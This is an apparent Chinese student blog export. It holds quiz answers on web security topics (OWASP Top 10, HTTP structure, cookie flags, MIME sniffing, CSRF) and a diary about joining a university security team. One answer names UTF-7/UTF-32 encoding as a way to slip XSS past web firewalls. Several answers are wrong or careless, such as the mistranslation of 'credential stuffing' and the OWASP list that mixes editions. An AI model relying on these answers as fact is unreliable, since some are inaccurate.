class="hljs">1.目前owasp的十大web安全漏洞是哪些？这些漏洞排名是按照漏洞的严重程度排序的还是按照漏洞的常见程度排序的？（2分）<br>注入、失效身份认证和会话管理、跨站脚本XSS、失效的访问控制、安全配置错误、敏感信息泄露、跨站请求伪造CSRF、使用含有漏洞的控件、攻击检测和防范不足、未受保护的 APIs、不安全的反序列化、不足的日志记录和监控<br><br>肯定是常见，因为每个漏洞都很常见。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/owasp-top-10.jpg.imgw.850.x.jpg" alt="owasp-top-10.jpg.imgw.850.x"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">2.请翻译一下credential stuffing（1分<br><br>证书填充<br></code></pre></td></tr></table></figure><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">3.</span>为什么说不充分的日志记录<span class="hljs-comment">(insufficient logging)</span>也算owasp十大漏洞的一种？他的危害性如何（<span class="hljs-number">2</span>分）<br><br>攻击者依靠监控的不足和响应的不及时来达成他们的目标而不被知晓。比如日志没有记录登录失败，那么攻击者可能就可以通过暴力破解多次进行登录尝试，但是日志中却没有记录。这就可能让攻击者成功入侵系统并隐匿自己的行踪。这个看似危害不大但却是十分严重的危害，因为一个日志系统不完善的服务器很容易遭受攻击并且在遭受攻击后无法判断攻击来源，这样就无法做出相应的防御，很可能再次遭受同样的攻击。<br><br>只要是漏洞都严重。<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">4</span>.请翻阅一下owasp testing guide，以及owasp testing guide check-list，视频说怎么结合这两个文档来学习渗透测试？ 结合你平时渗透过程中的经验，谈谈你的感想。（<span class="hljs-number">3</span>分）<br><br><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">5.</span>you are <span class="hljs-keyword">only</span> <span class="hljs-keyword">as</span> good <span class="hljs-keyword">as</span> you notes<br>   you are <span class="hljs-keyword">only</span> <span class="hljs-keyword">as</span> good <span class="hljs-keyword">as</span> things you can refer <span class="hljs-keyword">to</span><br>结合这两句话谈谈你的感想。（<span class="hljs-number">2</span>分）<br><br>我正在做的事情。<br></code></pre></td></tr></table></figure><h2 id="初学-视频3"><a href="#初学-视频3" class="headerlink" title="初学-视频3"></a>初学-视频3</h2><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs oxygene"><span class="hljs-number">1</span>.http报文的结构是什么？（<span class="hljs-number">1</span>分）<br><br><span class="hljs-number">1</span>、方式(<span class="hljs-keyword">method</span>)：客户端希望服务器对资源执行的动作，是一个单独的词，比如，<span class="hljs-title function_">GET</span>、<span class="hljs-title function_">POST</span>或<span class="hljs-title function_">HEAD</span><br><br>2、请求<span class="hljs-title function_">URL</span><span class="hljs-params">(request-URL)</span>：要直接与服务器进行对话，只要请求<span class="hljs-title function_">URL</span>是资源的绝对路径就可以了，服务器可以假定自己是<span class="hljs-title function_">URL</span>的主机/端口<br><br>3、版本<span class="hljs-params">(version)</span>：报文所使用的<span class="hljs-title function_">HTTP</span>版本。其格式：<span class="hljs-title function_">HTTP</span>/&lt;主要版本号&gt;.&lt;次要版本号&gt;<br><br>4、状态码<span class="hljs-params">(status-code)</span>：状态码是三位数字，描述了请求过程中所发生的情况。每个状态码的第一位数字都用于描述状态的一般类别<span class="hljs-params">(比如，“成功”、“出错”等等)</span><br><br>5、原因短语<span class="hljs-params">(reason-phrase)</span>：数字状态码的可读版本，包含行终止序列之前的所有文本。原因短语只对人类有意义，因此，尽管响应行<span class="hljs-title function_">HTTP</span>/1.0 200 <span class="hljs-title function_">NOT</span> <span class="hljs-title function_">OK</span>和<span class="hljs-title function_">HTTP</span>/1.0 200 <span class="hljs-title function_">OK</span>中原因短语的含义不同，但同样都会被当作成功指示处理<br><br>6、头部<span class="hljs-params">(header)</span>：可以有零个或多个头部，每个首部都包含一个名字，后面跟着一个冒号<span class="hljs-params">(:)</span>，然后是一个可选的空格，接着是一个值，最后是一个<span class="hljs-title function_">CRLF</span>首部是由一个空行<span class="hljs-params">(CRLF)</span>结束的，表示了头部列表的结束和实体主体部分的开始<br><br>7、实体的主体部分<span class="hljs-params">(entity-body)</span>：实体的主体部分包含一个由任意数据组成的数据块，并不是所有的报文都包含实体的主体部分，有时，报文只是以一个<span class="hljs-title function_">CRLF</span>结束。<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217225853.png" alt="QQ截图20220217225853"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-number">2.</span>什么是<span class="hljs-literal">crlf</span>？在<span class="hljs-keyword">http</span>报文的哪个位置。（<span class="hljs-number">1</span>分）<br>已答。回车换行，每行末位。<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">3</span>.解释下这几个头的含义（<span class="hljs-number">5</span>分）<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220217230327.png" alt="QQ截图20220217230327"></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-number">4</span>、cookie具有哪些特点，不同的域名和子域名对cookie有怎样的权限？Cookie的Secure和 HTTPOnly这两个flag分别有什么作用？请结合xss攻击来进行说明（<span class="hljs-number">3</span>分）<br><br>以键值对的形式临时存在。为域名设置的cookie，子域名也可读。子域名只可写自身的cookie。<br><br><span class="hljs-symbol">Secure:</span>限制只有通过https访问时才能传递cookie<br><br><span class="hljs-symbol">httponly:</span>阻止JavaScript读取cookie，可防xss攻击<br></code></pre></td></tr></table></figure><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">5.简述本视频提到的xss绕过web防火墙的方案（5分）<br>用UTF<span class="hljs-string">-7</span>/UTF<span class="hljs-string">-32</span>编码payload<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">6.内容嗅探是什么？主要有哪些类型？请分别举例，主要用途是什么？在什么情况下可以利用这些漏洞？。为什么facebook等网站需要使用不同的域名来存储图片？（5分）<br>通过解析文件的内容，来猜测MIME类型的格式。有浏览器嗅探和客户端嗅探。客户端嗅探可用来判断浏览器为什么浏览器。<br><br>有些MIME类型是可执行类型，可以通过混淆MIME嗅探算法来执行XSS。<br><br>防止内容嗅探。<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">7.同源策略是什么？限制是什么？浏览器在遇到哪两种情况的时候会用到同源策略？如何放松SOP限制？放松SOP限制会对浏览器插件安全造成怎样的破坏？<br><br></code></pre></td></tr></table></figure><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">8.</span>csrf是什么？如何设计规避csrf？视频中提到的错误的csrf配置方法是什么？<br>跨站请求伪造。<br><br>验证<span class="hljs-built_in">token</span>，验证HTTP请求的Referer，还有验证XHR里的自定义<span class="hljs-built_in">header</span>。<br><br>没有对请求来源进行验证/过滤<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">附加题：5、6两点主要利用的是由于服务端和客户端对同一信息的处理方式不同造成的漏洞，你还能举出相似的例子么？（1分）<br>SSTI<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>历程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>进入道格的那些事</title>
    <link href="/2022/02/24/%E8%BF%9B%E5%85%A5%E9%81%93%E6%A0%BC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <url>/2022/02/24/%E8%BF%9B%E5%85%A5%E9%81%93%E6%A0%BC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/</url>
    
    <content type="html"><![CDATA[<h1 id="记录进入道格的那些事"><a href="#记录进入道格的那些事" class="headerlink" title="记录进入道格的那些事"></a>记录进入道格的那些事</h1><p>由于换了电脑，每次给中哥交报告的时候，中哥都会说做个图床吧。害，之前的截图不见了（自己又去截图了下）。</p><p>有一说一感觉进道格有个手就行（可能神经有点不正常emmmm~~），但是没想到这一路过来这么坎坷。</p><h2 id="第一次面试"><a href="#第一次面试" class="headerlink" title="第一次面试"></a>第一次面试</h2><p>在第一次面试之前，已经水了一个学期了。我一直觉得我跟大二的学生一个水平（蜜汁自信），后来发现大二的学生都是可以自主分析pop链了，而我还沉迷在基本漏洞。然后第一次面试，在开学的那几天，然后第一次遇见中哥，进行了开开心心的面试（中哥太友好了，跟他的正经不匹配）。当然这第一次也没有正式进入道格。但是被夸了基础好，不知道是鼓励的话还是什么话。然后学学java，然后就步入了漫长的学习。中哥对熊海的评价，后面想了一晚上，第二天跟中哥深深的交流了一下。做好决定认真学！</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/%E4%B8%AD%E5%93%A53.png" alt="中哥3"></p><h2 id="第二次面试"><a href="#第二次面试" class="headerlink" title="第二次面试"></a>第二次面试</h2><p>终于经历了1个半月的学习java，再一次来面试。我信心十足，也许我才20岁，对任何事都是充满了信心。我再一次觉得我肯定能进道格了。面试也不错，中哥也说我进度跟的不错，但是他尽然让我自我介绍一下！！！！（必须吐槽一下）人都给我整傻了。结束的时候他说，要团队商量下。害~~，我这自信再一次被打击。不过这次的打击跟上一次不同，我感觉在逗我玩呢。但是没办法确实实力不足，也许我会的跟大二的一样多，pop链我也可以信手沾来，中哥就不会一而再的犹豫~，不过他一如既往的好，让我当了个道格实习成员。（我怀疑这是史无前例的），然后进入最终考核，挖洞！我以前想都不敢想。记得第一次面试之前，中哥让我审计熊海cms我当时候，看到那么多的代码，真的是傻乎乎，无从下手。忘记说了！是那个道格管理员说他叫陈嘉莉！！！我一直以为是个学姐，还是个温柔的学姐！！后来才知道是个男生！</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/%E4%B8%AD%E5%93%A52.png" alt="中哥2"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/%E4%B8%AD%E5%93%A5.png" alt="中哥"></p><h2 id="继一、二次面试感受"><a href="#继一、二次面试感受" class="headerlink" title="继一、二次面试感受"></a>继一、二次面试感受</h2><p>前前后后一个半月吧。给我的最大感受就是，学习信安的这条路上要少走弯路，但是不要怕走弯路，二者都可以给你同等的成长。谢谢在我的大二上的这学期，让我碰到中哥。</p><p>他还不把学习资料让我白嫖，至今我还是不能理解为什么！！！也许后面我会懂~~~是不是他觉得太便宜了。200可以跟女朋友撸管两次了。</p><p>学技术路上碰到这样一位恩师？哈哈哈哈哈我觉得肯定是能够算的上我师父的，学习路上让我少打点王者，问问题也会抽空回答我。太爱了！！！</p><p>前前后后还有很多事。有些太麻烦了，就懒得说了。害~~，希望我未来的道路上，能够遇到很多中哥这样的人！好好做好接下来的任务….马上就要进入道格了！坚持！</p><h2 id="第三次面试"><a href="#第三次面试" class="headerlink" title="第三次面试"></a>第三次面试</h2><p>太久了，忘记了哈哈哈哈~~</p><h2 id="最后一次"><a href="#最后一次" class="headerlink" title="最后一次"></a>最后一次</h2><p>中哥太忙了。结果是别的师傅面试的。（说实话自己不应该进道格的，但是给了我这个机会，就好好把握住。<img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/QQ%E6%88%AA%E5%9B%BE20220224203017.png" alt="QQ截图20220224203017"></p><p>​    </p>]]></content>
    
    
    
    <tags>
      
      <tag>历程</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
